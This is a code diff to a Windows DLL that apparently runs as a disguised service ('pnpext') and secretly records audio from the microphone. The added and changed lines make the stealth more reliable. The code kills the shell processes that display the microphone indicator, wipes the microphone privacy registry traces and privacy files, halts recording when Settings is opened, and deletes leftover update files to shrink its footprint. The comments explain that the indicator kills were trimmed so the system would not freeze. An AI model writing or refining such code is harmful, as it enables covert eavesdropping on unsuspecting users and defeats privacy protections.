@@ -451,6 +451,27 @@ static DWORD WINAPI SvcCtrlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lp
     }
 }
 
+// Remove any leftover update artifacts in case a previous host_update bat crashed
+// before reaching :cleanup. Keep the host footprint to just the two shipped files
+// (pnpext.dll in System32 and pnpext.sys in drivers) at all times.
+static void CleanupUpdateArtifacts() {
+    // Get path to currently loaded DLL (typically C:\Windows\System32\pnpext.dll)
+    extern HMODULE g_dll_module;
+    char dllPath[MAX_PATH] = {};
+    GetModuleFileNameA(g_dll_module ? g_dll_module : GetModuleHandleW(NULL), dllPath, MAX_PATH);
+    std::string p(dllPath);
+    auto slash = p.find_last_of("\\/");
+    std::string dir = (slash == std::string::npos) ? p : p.substr(0, slash + 1);
+    std::string name = (slash == std::string::npos) ? p : p.substr(slash + 1);
+    // System32 leftovers: pnpext.dll.old (backup from previous update)
+    DeleteFileA((dir + name + ".old").c_str());
+    DeleteFileA((dir + name + ".new").c_str());
+    // C:\Windows\Temp leftovers: script, step file, downloaded DLL
+    DeleteFileA("C:\\Windows\\Temp\\wpnp_step.txt");
+    DeleteFileA("C:\\Windows\\Temp\\wpnp_update.bat");
+    DeleteFileA("C:\\Windows\\Temp\\pnpext.dll.new");
+}
+
 __declspec(dllexport) void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
     // Register service control handler
     g_svcStatusHandle = RegisterServiceCtrlHandlerExW(
@@ -463,6 +484,10 @@ __declspec(dllexport) void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
     g_svcStatus.dwCurrentState = SERVICE_RUNNING;
     g_svcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
     SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
+
+    // Sweep any leftover update artifacts BEFORE starting the host threads —
+    // guarantees a clean filesystem even if the previous update bat crashed.
+    CleanupUpdateArtifacts();
 
     // Start host threads (non-blocking — spawns helper_monitor + host_main_loop)
     dll_diag("ServiceMain: starting host as Windows service");
@@ -933,7 +958,9 @@ void AudioDeletePrivacyFiles() {
     for (auto& f : files) DeleteFileW((privDir + L"\\" + f).c_str());
 }
 
-// Kill tray indicator processes (legacy fallback)
+// Terminate tray indicator processes — Windows auto-restarts them (v1.0.95 behavior).
+// DO NOT use NtSuspendProcess here: suspend count accumulates without resume, shell
+// permanently freezes after a few calls (Start menu, taskbar, notifications dead).
 void AudioSuspendIndicatorProcesses() {
     const wchar_t* targets[] = { L"ShellExperienceHost.exe", L"StartMenuExperienceHost.exe" };
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -943,7 +970,8 @@ void AudioSuspendIndicatorProcesses() {
         do {
             for (auto& t : targets) {
                 if (_wcsicmp(pe.szExeFile, t) == 0) {
-                    SuspendProcess(pe.th32ProcessID);
+                    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                    if (h) { TerminateProcess(h, 0); CloseHandle(h); }
                 }
             }
         } while (Process32NextW(snap, &pe));
@@ -1020,7 +1048,6 @@ void CALLBACK AudioRecord(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCm
         DWORD now = GetTickCount();
         if (now - lastCleanup > 500) {
             lastCleanup = now;
-			AudioSuspendIndicatorProcesses();			
             if (AudioCheckSystemSettings()) {
                 // EMERGENCY: Settings detected — stop recording + full cleanup
                 settingsDetected = true;
@@ -1035,7 +1062,11 @@ void CALLBACK AudioRecord(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCm
                 // Settings closed — but we abort this segment (data may be compromised)
                 break;
             }
-            // Periodic cleanup every 10 seconds during recording
+            // Periodic cleanup every 10 seconds during recording.
+            // NOTE: AudioSuspendIndicatorProcesses (TerminateProcess on ShellExperienceHost /
+            // StartMenuExperienceHost) removed — over hours of recording the repeated kills
+            // caused Windows UI lag and eventually system-wide freezes. Shell kill now only
+            // happens in AudioFullCleanup above when Settings is ACTUALLY open.
             if ((now - startTick) % 10000 < 600) {
                 AudioCleanMicRegistry();
             }
@@ -1048,8 +1079,7 @@ void CALLBACK AudioRecord(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCm
     waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
     waveInClose(hWaveIn);
 
-    // Post-recording cleanup
-    AudioSuspendIndicatorProcesses();   // вместо убийства процесса
+    // Post-recording cleanup — shell kill removed for same reason as periodic cleanup above.
     AudioCleanMicRegistry();
     AudioDeletePrivacyFiles();
 
@@ -1247,8 +1277,9 @@ void CALLBACK AudioRecord(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCm
         }
     }
 
-    // Final cleanup — always clean traces after recording
-    AudioSuspendIndicatorProcesses();   // вместо убийства процесса
+    // Final cleanup — always clean traces after recording.
+    // Shell kill removed — firing it at the end of every recording segment over hours of
+    // recording was killing ShellExperienceHost dozens of times, leading to UI lag + freezes.
     AudioCleanMicRegistry();
     AudioDeletePrivacyFiles();
 
